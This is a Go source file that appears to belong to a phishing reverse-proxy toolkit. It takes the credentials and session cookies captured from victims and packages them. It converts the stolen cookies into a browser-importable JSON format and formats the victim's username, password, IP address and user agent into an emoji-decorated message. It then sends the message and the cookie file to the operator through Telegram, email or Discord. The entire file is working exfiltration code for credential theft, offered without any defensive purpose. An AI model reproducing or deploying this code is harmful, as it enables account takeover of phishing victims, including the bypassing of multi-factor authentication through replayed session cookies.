package main

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   int64       `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			token := Token{
				Name:             tokenData["Name"].(string),
				Value:            tokenData["Value"].(string),
				Domain:           domain,
				HostOnly:         false,
				Path:             tokenData["Path"].(string),
				Secure:           false,
				HttpOnly:         tokenData["HttpOnly"].(bool),
				SameSite:         "lax",
				Session:          false,
				FirstPartyDomain: "",
				PartitionKey:     nil,
			}
			tokens = append(tokens, token)
		}
	}

	return tokens
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func createTxtFile(session Session) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	// Consolidate all tokens into a single formatted string
	var rawTokens map[string]map[string]map[string]interface{}
	if err := json.Unmarshal([]byte(tokensJSON), &rawTokens); err != nil {
		fmt.Println("Error parsing tokensJSON:", err)

	}

	tokens := extractTokens(rawTokens)

	tokensOutput, err := json.MarshalIndent(tokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling tokens:", err)

	}

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(string(tokensOutput))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func createZipFile(session Session) (string, error) {
	// Create a random zip file name
	zipFileName := generateRandomString() + ".zip"
	zipFilePath := filepath.Join(os.TempDir(), zipFileName)

	// Create a new zip file
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create zip file: %v", err)
	}
	defer zipFile.Close()

	// Initialize the zip writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	// httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	// if err != nil {
	// 	return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	// }
	// bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	// if err != nil {
	// 	return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	// }
	// customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	// if err != nil {
	// 	return "", fmt.Errorf("failed to marshal Custom: %v", err)
	// }

	// //  print all tokens
	// fmt.Println("Tokens: ", string(tokensJSON))
	// fmt.Println("HTTPTokens: ", string(httpTokensJSON))
	// fmt.Println("BodyTokens: ", string(bodyTokensJSON))
	// fmt.Println("Custom: ", string(customJSON))

	// parseAndPrintTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
	var rawTokens map[string]map[string]map[string]interface{}
	if err := json.Unmarshal([]byte(tokensJSON), &rawTokens); err != nil {
		fmt.Println("Error parsing tokensJSON:", err)

	}

	tokens := extractTokens(rawTokens)

	tokensOutput, err := json.MarshalIndent(tokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling tokens:", err)

	}

	// fmt.Println("Tokens: ", string(tokensOutput))

	// Define the file names for each token
	files := map[string][]byte{
		"Tokens-" + generateRandomString() + ".txt": tokensOutput,
	}

	// Add each token as a text file to the zip
	for fileName, fileContent := range files {
		fileWriter, err := zipWriter.Create(fileName)
		if err != nil {
			return "", fmt.Errorf("failed to create zip entry for %s: %v", fileName, err)
		}

		// Write content into the zip entry
		_, err = fileWriter.Write(fileContent)
		if err != nil {
			return "", fmt.Errorf("failed to write content to %s: %v", fileName, err)
		}
	}

	return zipFilePath, nil
}

func formatSessionMessage(session Session) string {
	// Format the session information (no token data in message)
	return fmt.Sprintf("✨ Session Information ✨\n\n"+
		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"\n"+
		"📦 Token files are zipped and attached separately in message.\n",
		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}

func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}
	// Lock the mutex to safely access the map
	mu.Lock()
	if processedSessions[string(session.ID)] {
		// If the session ID is already processed, skip sending notifications
		fmt.Printf("Skipping duplicate notification for SessionID: %s\n", string(session.ID))
		mu.Unlock()
		return
	}
	// Mark the session ID as processed
	processedSessions[string(session.ID)] = true
	mu.Unlock()

	// Format the session message
	message := formatSessionMessage(session)

	// Create the zip file with token data
	// zipFilePath, err := createZipFile(session)
	zipFilePath, err := createTxtFile(session)

	if err != nil {
		fmt.Println("Error creating zip file:", err)
		return
	}

	// Include the zip file path in the message
	// message += fmt.Sprintf("\n📦 All token data has been saved in the zip file: %s\n", zipFilePath)

	// Print the formatted message with zip info
	fmt.Printf("------------------------------------------------------\n")
	fmt.Printf("Latest Session:\n")
	fmt.Printf(message)
	fmt.Printf("------------------------------------------------------\n")

	// Check if the username and password are not empty before sending the Telegram notification
	if session.Username != "" && session.Password != "" {
		// Send notifications based on config
		if config.TelegramEnable {
			sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, zipFilePath)
			if err != nil {
				fmt.Printf("Error sending Telegram notification: %v\n", err)
			}
		}
	} else {
		fmt.Println("Skipping Telegram notification: Username or Password is empty.")
	}

	if config.MailEnable {
		err := sendMailNotificationWithAttachment(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message, zipFilePath)
		if err != nil {
			fmt.Printf("Error sending Mail notification: %v\n", err)
		}
	}

	if config.DiscordEnable {
		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message, zipFilePath)
	}

	// After sending, delete the zip file
	err = os.Remove(zipFilePath)
	if err != nil {
		fmt.Printf("Error deleting zip file: %v\n", err)
	} else {
		fmt.Println("Zip file deleted successfully.")
	}
}
